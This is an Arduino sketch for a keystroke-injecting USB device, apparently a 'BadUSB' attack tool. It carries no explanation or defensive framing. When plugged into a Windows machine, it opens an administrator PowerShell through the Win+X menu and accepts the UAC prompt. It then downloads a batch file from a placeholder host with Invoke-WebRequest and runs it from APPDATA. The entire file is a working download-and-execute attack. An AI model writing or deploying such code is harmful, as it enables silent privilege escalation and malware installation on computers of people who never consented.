#include <Keyboard.h>

void setup()
{
  delay(1000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);
  typeKey('a');
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  delay(500);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("cd $env:APPDATA");
  typeKey(KEY_RETURN);
  delay(200);
  Keyboard.println("Invoke-WebRequest 'https://website.payload' -OutFile 'payload.bat'");
  typeKey(KEY_RETURN);  
  delay(600);
  Keyboard.println(".\\payload.bat");
  delay(300);
  typeKey(KEY_RETURN);
  delay(600);
  Keyboard.end(); 
}

void loop() {}

void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
